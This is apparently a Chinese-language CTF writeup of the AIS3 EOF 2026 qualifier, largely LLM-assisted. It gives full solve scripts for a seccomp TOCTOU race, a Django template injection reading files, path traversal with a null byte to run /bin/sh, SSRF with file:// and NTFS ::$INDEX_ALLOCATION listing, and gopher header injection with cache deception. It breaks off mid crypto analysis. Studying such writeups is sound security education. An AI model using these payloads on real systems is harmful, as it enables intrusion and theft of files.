---
title: "AIS3 EOF 2026 Qual writeup"
date: 2025-12-24
draft: false
tags: ["CTF", "AIS3", "writeup", "pwn", "reverse", "web", "misc", "2025", "competition"]
categories: ["CTF", "Competition Writeup"]
author: "YJK"
showToc: true
TocOpen: false
---

## 前言

先排個雷，這次比賽的 writeup 很大比例是 LLM 協助完成的，包含題目分析、解題思路、程式碼撰寫等，多數題目都是，所以如果想看到 LLM 的極限可以參考這篇 writeup，但如果想看到純人力的解題過程可能不太適合 (X。

## Score/Rankings

![image](/images/ais3-eof-2026-qual/image_q.png)    
## welcome   
### Welcome   
![image](/images/ais3-eof-2026-qual/image_u.png)    
flag: `EOF{2026-quals-in-2025}`   

加入 discord 然後在 `announcement` 頻道旁邊   
![image](/images/ais3-eof-2026-qual/image_r.png)    
## misc   
### MRTGuessor   
![image](/images/ais3-eof-2026-qual/image_a.png)    
flag: `EOF{catch_up_MRT_by_checking_the_timetable_in_advance}` 
    
只有三次機會，要猜以下圖片是台北捷運板南線的哪一站   
![PXL_20251217_112653424](/images/ais3-eof-2026-qual/pxl_20251217_112653424.jpg)    
仔細比對各站的天花板跟燈的相對方向最後猜滿三次，答案是忠孝新生   
![image](/images/ais3-eof-2026-qual/image_0.png)    
### SaaS   
![image](/images/ais3-eof-2026-qual/image_8.png)    
flag: `EOF{TICTACTOE_TICKTOCTOU}`   
  
題目給了 `example.c` 和 `seccomp-sandbox.c` ，然後如題名所示是提供一個類似 SaaS 的 service，可以允許使用者上傳檔案，接下來會在一個有 seccomp rule 的 docker sandbox 裡面執行，那基本上就是要直接去讀 sandbox 裡面的 `/flag`  檔案，會被抓下來的部分如下   
![image](/images/ais3-eof-2026-qual/image_l.png)    
基本上 sandbox 使用 seccomp user notification 在 user-space 攔截並檢查相關的 syscall。   
結論來說 open 系列被欄之後會去檢查 pathname，link 系列會去防止 link-based bypass，mount 會防 FS rebind，name_handle_at 防 inode handle bypass，那整體流程經過分析 `seccomp-sandbox.c` 會得知流程為   
1. 透過 seccomp user notify 攔截 syscall   
2. 使用 `process_vm_readv`  讀取被 sandbox 程式記憶體中的 pathname   
3. 呼叫 `realpath()`  將路徑 canonicalize   
4. 若結果為 `/flag` ，則拒絕該 syscall   
   
所以後續所有能夠被解析成 `/flag`  的路徑都會被擋   
這題最後的漏洞是 `Time-of-Check Time-of-Use` ，發生原因如下：   
- sandbox 在檢查階段讀取一次 pathname   
- kernel 在實際 open 階段再從 user memory 讀取一次 pathname   
- 這兩次讀取之間存在時間差   
   
sandbox 錯誤假設 pathname 在這段期間不會改變 。   
所以最後是利用 race condition 的方式讓：   
- sandbox 看到的是安全路徑   
- kernel 使用的卻是 `/flag`    
   
作法如下：   
1. 在 user memory 中準備一個可修改的 `pathbuf`    
2. 建立一個 racing thread   
3. 該 thread 持續切換 `pathbuf` ：   
    - 大多數時間為 `/sandbox/app`    
    - 極短時間切換為 `/flag`    
4. 主 thread 不斷嘗試 `openat(pathbuf)`    
5. 當 sandbox 檢查時看到 benign path   
6. kernel copy pathname 時撞到 `/flag` ，成功開檔   
   
以下是 LLM 寫的 exploit   
```c
// gcc -nostdlib -static -O2 -fno-builtin -s toctou.c -o app
// x86_64 Linux only
typedef unsigned long u64;
typedef long          s64;
#define AT_FDCWD (-100)
#define O_RDONLY 0
/* -------- syscalls -------- */
static inline s64 sys_openat(int dirfd, const char *path, int flags, int mode) {
    s64 ret;
    register long r10 __asm__("r10") = mode;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "a"(257), "D"(dirfd), "S"(path), "d"(flags), "r"(r10)
        : "rcx", "r11", "memory"
    );
    return ret;
}
static inline s64 sys_read(int fd, void *buf, u64 len) {
    s64 ret;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "a"(0), "D"(fd), "S"(buf), "d"(len)
        : "rcx", "r11", "memory"
    );
    return ret;
}
static inline s64 sys_write(int fd, const void *buf, u64 len) {
    s64 ret;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "a"(1), "D"(fd), "S"(buf), "d"(len)
        : "rcx", "r11", "memory"
    );
    return ret;
}
static inline __attribute__((noreturn))
void sys_exit_group(int code) {
    __asm__ volatile (
        "syscall"
        :
        : "a"(231), "D"(code)
        : "rcx", "r11", "memory"
    );
    __builtin_unreachable();
}
/* clone(flags, child_stack, ptid, ctid, tls) */
static inline s64 sys_clone(u64 flags, void *child_stack) {
    s64 ret;
    __asm__ volatile(
        "xor %%rdx, %%rdx\n\t"   /* ptid = 0 */
        "xor %%r10, %%r10\n\t"   /* ctid = 0 */
        "xor %%r8,  %%r8\n\t"    /* tls  = 0 */
        "syscall"
        : "=a"(ret)
        : "a"(56), "D"(flags), "S"(child_stack)
        : "rcx", "r11", "rdx", "r10", "r8", "memory"
    );
    return ret;
}
/* -------- tiny helpers -------- */
static inline int has_prefix_eof(const char *buf, s64 n) {
    // look for "EOF{" somewhere in buf
    for (s64 i = 0; i + 3 < n; i++) {
        if (buf[i] == 'E' && buf[i+1] == 'O' && buf[i+2] == 'F' && buf[i+3] == '{')
            return 1;
    }
    return 0;
}
/* -------- shared state -------- */
static volatile int go = 0;
/* the path we race on */
static char pathbuf[32] = "/sandbox/app";
/* write pathbuf = "/flag" or "/sandbox/app" without libc */
static inline void set_flag_path(void) {
    // "/flag\0"
    pathbuf[0] = '/';
    pathbuf[1] = 'f';
    pathbuf[2] = 'l';
    pathbuf[3] = 'a';
    pathbuf[4] = 'g';
    pathbuf[5] = 0;
}
static inline void set_benign_path(void) {
    // "/sandbox/app\0"
    const char s[] = "/sandbox/app";
    for (int i = 0; i < (int)sizeof(s); i++) pathbuf[i] = s[i];
}
/* -------- racing thread -------- */
__attribute__((noreturn))
static void racer(void) {
    // Duty cycle: mostly benign, very brief "/flag" pulses.
    // This aims for: sandbox reads benign; kernel copies during rare flag pulse.
    for (;;) {
        if (!go) continue;
        // big benign window
        for (int k = 0; k < 20000; k++) {
            set_benign_path();
            __asm__ volatile("" ::: "memory");
        }
        // tiny flag pulse
        for (int k = 0; k < 20; k++) {
            set_flag_path();
            __asm__ volatile("" ::: "memory");
        }
    }
}
/* -------- entry -------- */
__attribute__((noreturn))
void _start(void) {
    // set up a stack for the child thread
    static unsigned char child_stack[1 << 16];
    // clone flags for a thread-like clone
    // CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM
    const u64 CLONE_VM      = 0x00000100;
    const u64 CLONE_FS      = 0x00000200;
    const u64 CLONE_FILES   = 0x00000400;
    const u64 CLONE_SIGHAND = 0x00000800;
    const u64 CLONE_SYSVSEM = 0x00040000;
    const u64 CLONE_THREAD  = 0x00010000;
    void *sp = child_stack + sizeof(child_stack);
    s64 tid = sys_clone(CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM, sp);
    if (tid == 0) {
        racer();
    }
    char buf[4096];
    // Try many times (time limit 5s): if TOCTOU works, you'll hit it quickly.
    for (int attempt = 0; attempt < 2000; attempt++) {
        set_benign_path();
        go = 1;
        s64 fd = sys_openat(AT_FDCWD, (const char*)pathbuf, O_RDONLY, 0);
        // After syscall returns, stop racing for a moment
        go = 0;
        if (fd >= 0) {
            s64 n = sys_read((int)fd, buf, sizeof(buf));
            if (n > 0 && has_prefix_eof(buf, n)) {
                sys_write(1, buf, (u64)n);
                sys_exit_group(0);
            }
        }
    }
    // If not found, just exit silently (matches your runner behavior)
    sys_exit_group(0);
}
```
上傳之後就得到 flag 了   
![image](/images/ais3-eof-2026-qual/image_b.png)    
### fun   
![image](/images/ais3-eof-2026-qual/image_2.png)    
flag: `EOF{si1Ks0Ng_15_g0oD_T0}` 
     
題目給了三個檔案，分別是 `loader` ：會去 load 和 attach 到 eBPF 程式、`xdp_prog.o`：eBPF XDP object file、`flag.enc`：被 encrypted 的 flag   
分析 loader 後發現他的主要功能是   
1. 載入 eBPF 物件檔 `xdp_prog.o`   
2. 尋找並將 `xdp_encoder` 程式掛載到 loopback 介面（ `lo`）   
3. 建立 perf buffer，用來接收 eBPF 程式傳回的事件   
4. 透過 `handle_event` callback 處理從 eBPF 傳回的資料   
   
`handle_event` 函式如下   
```c
void handle_event(void *ctx, int cpu, void *data, __u32 data_sz) {
    if (*(_DWORD *)data <= 0x40u) {
        printf("[+] Encoded Flag (Hex): ");
        // 前 4 個位元組是長度，其餘是編碼後的資料
        for (int i = 0; i < *(_DWORD *)data; i++) {
            printf("%02x", *((unsigned char *)data + i + 4));
        }
        putchar('\n');
        stop = 1;
    }
}
```
功能是   
- eBPF 程式會處理封包資料   
- 處理完成後，透過 perf buffer 將「編碼後的 flag」傳回 userspace   
- userspace 只負責印出資料，不做額外解密   
   
那 eBPF 程式在 `xdp_prog.o`，流程是   
1. 驗證封包是否為 UDP   
2. 驗證目的 port 是否為 `0x2823`   
3. 從封包 payload 的 offset `0x2a`（十進位 42）開始讀取資料   
4. 對每個位元組進行 XOR 運算   
5. 將 XOR 後的結果存入 buffer   
6. 透過 perf buffer 將編碼結果送回 userspace   
   
以上流程為 LLM 使用 `llvm-objdump` 進行反組譯分析的結果   
那 XOR 操作可能如下   
![image](/images/ais3-eof-2026-qual/image_k.png)    
所以可能是   
- 從封包中讀取一個 byte   
- 使用硬編碼的 key（此例為 `0xaf`）進行 XOR   
- 將結果寫入 stack buffer   
   
可以直接使用以下方是拿到 key

```shell
llvm-objdump-18 -d xdp_prog.o | grep "a7 04 00 00" | awk '{print $6}'
```

可以拿到以下的 key  

```markdown
af f4 84 2d 04 9a 39 0f 2b c0 1d 78 d9 b7 0a 7d
0b a5 ba 11 b9 96 bb aa e6 75 e1 ab 68 8f 46 58
1c 66 0e 42 56 ec 87 5c c5 7f 53 2d 1d 33 ac d8
36 45 0e f0 84 c5 af 39 09 ca ae ec 1d cf e0
```

`flag.enc` 存了 hex 後 XOR 的 flag  

```markdown
eabbc25677f3084458f0531f86863f226c95d555e6c28bd7
```

最後的 script 如下

```python
def extract_xor_keys():
    # XOR keys extracted from eBPF program
    # These are the immediate values used in XOR operations (a7 04 00 00 XX)
    return (
        "aff4842d049a390f2bc01d78d9b70a7d0ba5ba11b996bbaa"
        "e675e1ab688f46581c660e4256ec875cc57f532d1d33acd8"
        "36450ef084c5af3909caaeec1dcfe0"
    )
def decrypt_flag(encrypted_hex, xor_keys_hex):
    # Convert hex strings to bytes
    encrypted = bytes.fromhex(encrypted_hex)
    xor_keys = bytes.fromhex(xor_keys_hex)
    # Ensure we have enough keys
    if len(encrypted) > len(xor_keys):
        raise ValueError(f"Not enough XOR keys! Need {len(encrypted)}, have {len(xor_keys)}")
    # Decrypt by XORing (XOR is self-inverse)
    decrypted = bytes([encrypted[i] ^ xor_keys[i] for i in range(len(encrypted))])
    return decrypted.decode('ascii')
def main():
    print("=" * 60)
    print("AIS3 EOF 2025 - fun Challenge Solver")
    print("eBPF XOR Decryption")
    print("=" * 60)
    # Read encrypted flag
    try:
        with open('flag.enc', 'r') as f:
            encrypted_hex = f.read().strip()
    except FileNotFoundError:
        print("Error: flag.enc not found!")
        return
    print(f"\n[+] Encrypted flag (hex): {encrypted_hex}")
    print(f"[+] Encrypted length: {len(bytes.fromhex(encrypted_hex))} bytes")
    # Extract XOR keys
    xor_keys_hex = extract_xor_keys()
    print(f"\n[+] XOR keys extracted from eBPF program")
    print(f"[+] XOR keys (hex): {xor_keys_hex}")
    print(f"[+] XOR keys length: {len(bytes.fromhex(xor_keys_hex))} bytes")
    # Decrypt
    try:
        flag = decrypt_flag(encrypted_hex, xor_keys_hex)
        print(f"\n{'=' * 60}")
        print(f"[*] FLAG: {flag}")
        print(f"{'=' * 60}")
    except Exception as e:
        print(f"\n[-] Decryption failed: {e}")
if __name__ == "__main__":
    main()
```

### Welcome To The Django

![image](/images/ais3-eof-2026-qual/image_9.png)    
flag: `EOF{59046f5869f733a3a0f8}`  
   
這一題是一個 Django 的 web，並且有 SSTI 漏洞，使用者的輸入會被丟到 f-string 中，並交由 Django 的 template engine 進行渲染。 

```python
def index(request):
    name = html.escape(request.GET.get('name', ''))
    if len(name) > 210:
        return HttpResponse('Your name is too long!')
    
    template = engines['django'].from_string(
        f"<pre>Hello, {name}!</pre>"
    )
    return HttpResponse(template.render({}, request))
```

那有以下的限制   
1. 有套用`html.escape()`    
    - 會過濾： `"`、 `'`、 `<`、 `>`、 `&`   
2. Payload 長度限制為 210 字元   
3. DEBUG 模式關閉   
4. 底線（underscore）限制   
    - Django template 會阻擋存取以 `_` 開頭的屬性   
   
所以首先要先找到通往 PosixPath 的路徑，那因為有些 payload 的限制，那經過 LLM 大量嘗試後找到一條可以用的 payload   

```shell
request.resolver_match.tried.1.0.urlconf_name.views.engines.django.template_dirs.0.cwd.parent
```

意義如下：   
1. `request.resolver_match.tried.1.0`   
    - 取得 echo app 的 `URLResolver`   
2. `.urlconf_name`   
    - 回傳 `echo.urls` module   
    - （比 `urlconf_module` 更短，節省字元）   
3. `.views`   
    - 取得 `echo.views` module   
4. `.engines.django`   
    - 存取 DjangoTemplates backend   
5. `.template_dirs.0`   
    - 回傳 admin templates 目錄的 `PosixPath`   
6. `.cwd.parent`   
    - 取得目前工作目錄的 parent，也就是 `/`   
   
那基本上  Flag 位於一個隨機命名的目錄中，所以其實不用管取得當前路徑的事情 (X，只需要觀察 docker 的檔案就好   
後續發現，flag 目錄在 root `/` 底下的排序結果中，永遠是字母排序最後一個   
所以可以利用 forloop.last 拿到該目錄   
那最後因為 payload 長度限制，所以 LLM 就不斷縮減他的 payload 不斷嘗試，最後拿到 flag 的目錄如下 

```python
{%for d in request.resolver_match.tried.1.0.urlconf_name.views.engines.django.template_dirs.0.cwd.parent.iterdir%}{%if forloop.last%}{%for f in d.iterdir%}{{f.read_text}}{%endfor%}{%endif%}{%endfor%}
```

最後的 solve script 如下   

```python
import requests
import re
import sys
def exploit(base_url):
    # The exploit payload (199 chars - under 210 limit)
    # Uses no-space template tags to save 12 characters
    payload = (
        "{%for d in request.resolver_match.tried.1.0.urlconf_name"
        ".views.engines.django.template_dirs.0.cwd.parent.iterdir%}"
        "{%if forloop.last%}"
        "{%for f in d.iterdir%}"
        "{{f.read_text}}"
        "{%endfor%}"
        "{%endif%}"
        "{%endfor%}"
    )
    print(f"[*] Target: {base_url}")
    print(f"[*] Payload length: {len(payload)} chars")
    try:
        r = requests.get(base_url, params={'name': payload}, timeout=30)
        # Extract flag from response
        if 'EOF{' in r.text:
            match = re.search(r'EOF\{[^}]+\}', r.text)
            if match:
                flag = match.group(0)
                print(f"[+] Flag: {flag}")
                return flag
        # Check for errors
        if r.status_code == 500:
            print("[-] Server returned 500 error")
        elif 'too long' in r.text.lower():
            print("[-] Payload too long!")
        else:
            # Maybe flag is in a different format
            match = re.search(r'<pre>Hello, (.*?)!</pre>', r.text, re.DOTALL)
            if match:
                content = match.group(1)
                print(f"[*] Response: {content[:200]}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
    return None
def list_root(base_url):
    payload = (
        "{%for x in request.resolver_match.tried.1.0.urlconf_name"
        ".views.engines.django.template_dirs.0.cwd.parent.iterdir%}"
        "{{x}}\n"
        "{%endfor%}"
    )
    print(f"[*] Listing root directory...")
    try:
        r = requests.get(base_url, params={'name': payload}, timeout=30)
        match = re.search(r'<pre>Hello, (.*?)!</pre>', r.text, re.DOTALL)
        if match:
            content = match.group(1)
            for line in content.strip().split('\n'):
                if 'flag' in line.lower():
                    print(f"[+] Flag directory: {line}")
                    return line
            print(content)
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
    return None
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <target_url>")
        print("Example: python3 solve.py https://challenge.example.com:20003")
        sys.exit(1)
    target = sys.argv[1].rstrip('/')
    # Run exploit
    flag = exploit(target)
    if not flag:
        print("\n[*] Trying to list root directory...")
        list_root(target)
```
![image](/images/ais3-eof-2026-qual/image_n.png)    

## Web   

### Bun.PHP   

![image](/images/ais3-eof-2026-qual/image_1.png)    
flag: `EOF{1_tUrn3d_Bun.PHP_Int0_4_r34l1ty}`   
  
這一題是是一個 Bun HTTP server，並以 CGI 模式執行 PHP。   
路由 `/cgi-bin/:filename` 僅檢查檔名是否以 `.php` 結尾，接著就透過 `php-cgi` 執行該檔案。   
由於：   
- URL decode 的斜線（ `%2f`）會被 decode 為 `/`   
- 路徑是使用 `resolve()` 建立，但沒有做 path traversal 檢查   
- 可利用 null byte 截斷檔名   
   
因此我們可以用 `..%2f` 跳出 `cgi-bin` 目錄，同時用 `%00` 繞過 `.php` 副檔名檢查，最終執行任意 binary。   
利用這一點，我們可以執行 `/bin/sh`，再呼叫具有 SUID 權限的 `/readflag` helper 來取得 flag。   
所以 Exploitation path 如下   
1. 使用 URL 編碼斜線與 path traversal，導向 `/bin/sh`   
2. 利用 `%00.php` 來繞過 `.php` 副檔名檢查   
3. 在 POST body 中送出 shell script，執行 `/readflag`   
4. 將 flag 以 HTTP header 輸出，讓 Bun 從 CGI 輸出中解析   
   
solve script 如下   

```python
#!/usr/bin/env python3
import argparse
import ssl
import sys
import urllib.request
TRAVERSAL_PATH = (
    "/cgi-bin/..%2f..%2f..%2f..%2f..%2fbin%2fsh%00.php"
)
SHELL_PAYLOAD = (
    "printf 'X: '; /readflag give me the flag; printf '\\r\\n\\r\\n'"
).encode()
def build_url(base_url: str) -> str:
    if base_url.endswith("/"):
        base_url = base_url[:-1]
    return base_url + TRAVERSAL_PATH
def fetch_flag(base_url: str, insecure: bool) -> str:
    url = build_url(base_url)
    req = urllib.request.Request(url, data=SHELL_PAYLOAD, method="POST")
    req.add_header("Content-Type", "text/plain")
    context = None
    if url.startswith("https://") and insecure:
        context = ssl._create_unverified_context()
    with urllib.request.urlopen(req, context=context, timeout=10) as resp:
        # The flag is placed in the X header by the shell payload.
        flag = resp.headers.get("X")
        if not flag:
            raise RuntimeError("Flag header not found; exploit may have failed")
        return flag.strip()
def main() -> int:
    parser = argparse.ArgumentParser(description="Solve Bun.PHP challenge")
    parser.add_argument(
        "url",
        nargs="?",
        default="http://127.0.0.1:18080",
        help="Base URL, e.g. http://127.0.0.1:18080 or https://host:port",
    )
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="Disable TLS verification (useful for CTF endpoints)",
    )
    args = parser.parse_args()
    try:
        flag = fetch_flag(args.url, args.insecure)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    print(flag)
    return 0
if __name__ == "__main__":
    raise SystemExit(main())

```
![image](/images/ais3-eof-2026-qual/image_m.png)  

### CookieMonster Viewer  

![image](/images/ais3-eof-2026-qual/image_h.png)    
flag: `EOF{w0rst_f1t_4rg_1nj3ct10n_w/_format_string!}`   
  
這題是黑箱的 web，基本上是給一個簡單的 Flask，跑在 Windows Server Core container 中。   
該服務允許使用者透過指定一個 URL，讓伺服器幫忙「preview」該 URL 的內容。   
那 LLM 有拉到 app.py 跟 dockerfile   
app.py   
```python
from flask import Flask, request, send_from_directory, send_file, render_template_string
import subprocess
import os

app = Flask(__name__, static_folder='static')

def get_os():
    import ctypes.wintypes
    v = ctypes.windll.kernel32.GetVersion()
    return f"Windows {v & 0xFF}.{(v >> 8) & 0xFF}"

class User:
    def __init__(self, name):
        self.name = name
    def __str__(self):
        return self.name

@app.route('/')
def index():
    with open('static/index.html', encoding='utf-8') as f:
        return render_template_string(f.read(), os_info=get_os())

@app.route('/api/preview', methods=['POST'])
def preview():
    data = request.get_json()
    url = data.get('url', '')
    user = User(data.get('username', 'Guest'))
    
    result = subprocess.run([r'.\lib\curl.exe', url], capture_output=True, text=True, encoding='utf-8', errors='replace')
    content = result.stdout or result.stderr
    
    try:
        return content.format(user=user)
    except:
        return content

@app.route('/api/templates/<name>')
def get_template(name):
    try:
        return send_file(f'templates/{name}.html')
    except Exception as e:
        return f'Template not found: {e}', 404


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

```

dockerfile   
```yaml
FROM python:3.12-windowsservercore-ltsc2022

WORKDIR /supersecureyouwillneverguessed

COPY requirements.txt .
RUN python -m pip install --no-cache-dir -r requirements.txt

COPY . .

# First move the flag (while we have write access)
SHELL ["powershell", "-Command"]
RUN $rand = -join ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_}); Move-Item C:\supersecureyouwillneverguessed\flag.txt C:\flag-$rand.txt; attrib +R (Get-Item C:\flag-*.txt).FullName

# Then lock down permissions
SHELL ["cmd", "/S", "/C"]
RUN net user /add appuser && \
    attrib +R C:\supersecureyouwillneverguessed\*.* /S && \
    icacls C:\supersecureyouwillneverguessed /grant appuser:(OI)(CI)(RX) /T && \
    icacls C:\supersecureyouwillneverguessed /deny appuser:(WD,AD,DC)

USER appuser
CMD ["python", "app.py"]

```

原則上是透過 SSRF 去拉到的   
因為 /api/preview 會接收一個 url 參數並且跑以下程式碼   
`subprocess.run([r'.\lib\curl.exe', url], …)`   
基本上會   
- 支援 `http://`、 `file://` 等 protocol   
- 可讀取本地檔案，例如：   
    `file:///C:/Windows/win.ini`   
   
不過基本上不可以列舉目錄   
另一個漏洞點是 SSTI，因為他會將 curl 的輸出進行 format   
`return content.format(user=user)`   
也就是說如果可以讓 curl 回傳類似於   
`{user.init…}`   
的字串，就會在 str.format() 被解析，所以可以去遍歷Python 物件結構(os、sys…)，還有讀去環境資訊跟屬性，但有以下限制   
- `str.format()`不允許函式呼叫   
- 因此無法直接達成 RCE   
   
那根據 dockerfile 會發現 flag 會在 `C:\flag-<RANDOM_STRING>\flag.txt` ，另外 `RANDOM_STRING`長度是 16，所以基本上必須得直接得知檔案路徑才可以，無法進行暴力猜測   
最後使用 NTFS Alternate Data Streams（ADS）的方式，可以使用 `::$INDEX_ALLOCATION`的方式拿到資料，像是

```sh
file:///C:/::$INDEX_ALLOCATION
```

接下來就可以去讀檔案拿到 flag 了   
所以 Exploitation path 基本上是   
- 列出目錄內容   
   
向 `/api/preview` 請求：  

```sh
file:///C:/::$INDEX_ALLOCATION
```

回傳內容包含 `C:\` 底下所有檔名，可以獲得 flag 所在資料夾   
- 讀取 Flag   
   
再發送一次 SSRF 請求讀取   
solve script 如下   

```python
import requests
import re
BASE_URL = "http://chals2.eof.ais3.org:21772/api/preview"
def solve():
    # Step 1: List directory using NTFS ADS
    # accessing ::$INDEX_ALLOCATION allows reading the directory index as a file
    print("[*] Listing C:\\ via ::$INDEX_ALLOCATION...")
    try:
        res = requests.post(BASE_URL, json={
            "url": "file:///C:/::$INDEX_ALLOCATION",
            "username": "pwn"
        }, timeout=10).text
    except Exception as e:
        print(f"[-] Error listing directory: {e}")
        return
    # Step 2: Extract flag filename
    match = re.search(r"flag-[a-zA-Z0-9]+\.txt", res)
    if not match:
        print("[-] Flag file not found in listing.")
        # Debug output if needed
        # print(res[:500])
        return
    flag_file = match.group(0)
    print(f"[+] Found flag file: {flag_file}")
    # Step 3: Read flag
    print(f"[*] Reading {flag_file}...")
    try:
        flag = requests.post(BASE_URL, json={
            "url": f"file:///C:/{flag_file}",
            "username": "pwn"
        }, timeout=10).text
        print(f"\n[+] FLAG: {flag.strip()}")
    except Exception as e:
        print(f"[-] Error reading flag: {e}")
if __name__ == "__main__":
    solve()

```
![image](/images/ais3-eof-2026-qual/image.png) 

### LinkoReco   

![image](/images/ais3-eof-2026-qual/image_p.png)    
flag: `EOF{たきな、スイーツ追加！それがないなら……修理？やらないから！}`  
   
這一題是灰箱，不過基本上重點如下：   
利用位於 `/static/` 底下的 cache deception 路徑，讓 PHP 的回應被快取。接著透過 SSRF + `gopher://` 注入 HTTP header（ `X-Real-IP`），使 nginx 誤以為請求來自本機，進而顯示 token。取得 token 後，利用 `file://` 讀檔，並解析 `/proc/self/mountinfo` 找出被 bind-mount 的 flag 檔名，最後讀取 flag。   
那 recon 到的資訊有Nginx 會將 `/static/\*.jpg` 標記為可快取（ `X-Debug-Static-Match: 1`），即使實際上最後是由 PHP 執行   
也就是說路徑：`/static/..%2findex.php%2f.jpg`會被路由到 PHP，但仍符合 static cache 規則應用程式只有在`$_SERVER['HTTP_X_FORWARDED_FOR'] ≡ $server_ip` 時，才會顯示完整 token 取得有效 token 後， `file://` 的回應會被原樣回傳（包在 `<pre>` 中）Flag 以 bind-mount 的方式掛載到 `/etc/` 底下的一個隨機檔名  
- 可從 `/proc/self/mountinfo` 中發現    
所以 Exploitation path 差不多如下   
- Cache Deception 路徑
`GET /static/..%2findex.php%2f<rand>.jpg`此請求：   
    - 被 nginx 視為「靜態資源」並進行快取   
    - 但實際上仍由 PHP 執行
- 使用 gopher 的 SSRF 注入 Header   

透過 `gopher://web:80/_...` 向 nginx 發送原始 HTTP 請求，並加入：
`X-Real-IP: 127.0.0.1`
   
效果：   
- 讓應用程式誤判請求來源為本機   
- 快取後的回應中即會包含完整 token，例如：
`あなたのトークン: 200_OK_FROM_WA1NU7`
- 使用 token 透過 file:// 讀檔
`url=file:///proc/self/mountinfo`
從回應中可得知 flag 被 bind-mount 的實際路徑，例如：`/etc/ca7_f113.txt`
- 讀取 Flag
`url=file:///etc/ca7_f113.txt`

```bash
#!/usr/bin/env bash
set -euo pipefail
BASE_URL="${BASE_URL:-http://chals1.eof.ais3.org:19080}"
RAND="${RAND:-goph$RANDOM}"
need() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "Missing dependency: $1" >&2
    exit 1
  }
}
need curl
need python3
need rg
# Build gopher payload to inject X-Real-IP (treated as local by the app)
PAYLOAD="$(python3 - <<PY
import urllib.parse
rand = "$RAND"
req = f"GET /static/..%2findex.php%2f{rand}.jpg HTTP/1.1\r\nHost: web\r\nX-Real-IP: 127.0.0.1\r\nConnection: close\r\n\r\n"
print(urllib.parse.quote(req))
PY
)"
# Trigger SSRF to nginx with injected header
curl -s -X POST --data-urlencode "url=gopher://web:80/_$PAYLOAD" "$BASE_URL/" >/dev/null
# Fetch cached response to extract token
TOKEN="$(curl -s "$BASE_URL/static/..%2findex.php%2f${RAND}.jpg" | rg -o 'あなたのトークン: [^<]+' | sed 's/^あなたのトークン: //')"
if [[ -z "$TOKEN" ]]; then
  echo "Failed to extract token" >&2
  exit 1
fi
echo "Token: $TOKEN"
# Read mountinfo to find the /etc/*.txt bind mount
MOUNTINFO_RAW="$(curl -s -X POST -d "url=file:///proc/self/mountinfo&send_token=1&token_input=$TOKEN" "$BASE_URL/")"
MOUNTINFO="$(printf '%s' "$MOUNTINFO_RAW" | python3 -c 'import html,sys; print(html.unescape(sys.stdin.read()))')"
FLAG_PATH="$(printf '%s' "$MOUNTINFO" | awk '{for (i=1;i<=NF;i++) if ($i ~ /^\/etc\/.*\.txt$/) {print $i; exit}}')"
if [[ -z "$FLAG_PATH" ]]; then
  echo "Failed to locate flag path in mountinfo" >&2
  echo "Debug (first 5 /etc lines):" >&2
  echo "$MOUNTINFO" | rg -n '/etc/' | head -n 5 >&2
  exit 1
fi
echo "Flag path: $FLAG_PATH"
# Read flag
FLAG="$(curl -s -X POST -d "url=file://$FLAG_PATH&send_token=1&token_input=$TOKEN" "$BASE_URL/" | rg -o 'EOF\{[^}]+\}' | head -n1)"
if [[ -z "$FLAG" ]]; then
  echo "Failed to read flag" >&2
  exit 1
fi
echo "Flag: $FLAG"

```

![image](/images/ais3-eof-2026-qual/image_o.png)  

## Crypto   

### catcat's message  

![image](/images/ais3-eof-2026-qual/image_c.png)    
flag: `EOF{cats_dont_like_you_for_breaking_their_meowderful_scheme_...🐈⚔🐈}`  

題目給了一個 `chal.py` 和輸出 `output.txt`。   
該腳本執行流程如下：   
1. 從 `flag.txt` 載入 flag   
2. 在大質數有限域 $GF(p)$ 上定義橢圓曲線      
$$
E:y^2=x^3+1
$$
3. 定義兩個多項式：   
    - $P_1(x)$（變數 `MmMeoOOOoOoW`）   
    - $P_2(x)$（變數 `MmMeoOOOoOow`）   
        其係數皆為大整數   
4. 在曲線上定義兩個 base point：   
    - $G_1$（ `mmEow`）   
    - $G_2$（ `mmEoW`）   
5. 對 flag 的每一個 bit $b \in {0,1}$：   
    - 產生隨機 scalar `uwub`   
    - 產生隨機值 `meoW`   
    - 透過函式 `MEOw` 輸出兩個橢圓曲線點 $O_1, O_2$   
   
MEOw 函式的行為分析   
對於每一個 flag bit $b$，會呼叫 `MEOw` 兩次：   
呼叫 1
`MEOw(rand1, meoW, meOwO = b^1)`
   
- 實際使用的 flag bit：   
    
$$
f_1 = b \oplus 1
$$
- 回傳：   
    
$$
O_1=(P_2(rand1)+(1−f_1)⋅uwub)G_1+(P_1(meoW)+f_1⋅uwub)G_2
$$
   
呼叫 2
MEOw(meoW, rand2, meOwO = b^0)
   
- 實際使用的 flag bit：   
    
$$
f_2 = b \oplus 0 = b
$$
- 回傳：   
    
$$
O_2​=(P_2​(meoW)+(1−f_2​)⋅uwub)G_1​+(P_1​(rand2)+f_2​⋅uwub)G_2​
$$
- 數學分析（Mathematical Analysis）   
    - 核心漏洞：係數之間的關聯性   
        `uwub` 是一個大型隨機遮罩（masking scalar）。   
        只要某個係數包含 `uwub`，在任何足夠大的子群中，它看起來就會像是均勻隨機。   
        關鍵在於：依據 bit $b$ 的值，輸出點中會存在「未被 uwub 汙染的乾淨係數（clean component）」。   
        我們定義：   
        $C(G, P)$ 表示點 $P$ 中，基底點 $G$ 的純量係數   
    - 情況一：$b = 0$   
        - $f_1 = 1$
        $$
        O_1 = P_2(\text{rand1})G_1 + (P_1(\text{meoW}) + \text{uwub})G_2
        $$
        - $f_2 = 0$
        $$
        O_2 = (P_2(\text{meoW}) + \text{uwub})G_1 + P_1(\text{rand2})G_2
        $$
   
        乾淨係數：   
        - $C(G_1, O_1) = P_2(\text{rand1})$   
